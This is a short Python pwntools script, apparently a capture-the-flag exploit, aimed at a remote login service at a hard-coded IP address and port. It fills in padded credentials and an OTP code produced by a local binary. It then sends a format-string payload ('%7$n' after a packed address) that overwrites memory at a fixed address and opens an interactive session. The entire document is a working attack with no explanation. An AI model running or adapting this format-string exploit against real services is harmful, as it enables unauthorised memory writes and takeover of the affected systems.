from pwn import *
import subprocess
#io=process("./binary")
#gdb.attach(io,"b*0x0804953e")
io=remote("185.66.87.233",5002)
io.recvuntil("Login: ")
io.send("test_account\0".ljust(16,"a"))
io.recvuntil("Password: ")
output = subprocess.Popen("./a.out", stdout=subprocess.PIPE)
r=output.stdout.read()
io.sendline("test_password\0".ljust(32,"b"))
io.recvuntil("OTP code: ")
io.sendline(str(r))
io.recvuntil("[4] Exit\n> ")
io.sendline("2")
io.recvuntil("Set station > ")
addr=0x0804c058
io.sendline(p32(addr)+"%7$n")
io.interactive()
